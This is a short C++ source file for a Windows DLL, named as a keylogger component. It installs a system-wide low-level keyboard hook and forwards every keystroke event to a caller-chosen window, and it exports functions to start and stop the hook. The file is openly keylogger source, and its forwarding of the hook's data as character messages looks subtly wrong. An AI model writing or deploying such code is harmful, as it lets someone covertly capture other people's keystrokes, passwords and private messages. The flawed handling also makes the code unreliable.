#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include "stdafx.h"
#include "keyloggerDll.h"

using namespace std;

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;
HWND hWndBeeper = NULL;
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0) {
		SendMessage(hWndBeeper, WM_CHAR, wParam, lParam);
	}
	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void HookStart(HWND hWnd)
	{
		hWndBeeper = hWnd;
		g_hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyHookProc, g_hInstance, 0);
	}
	__declspec(dllexport) void HookStop()
	{
		if (g_hHook)
		{
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}
	}
#ifdef __cplusplus
}
#endif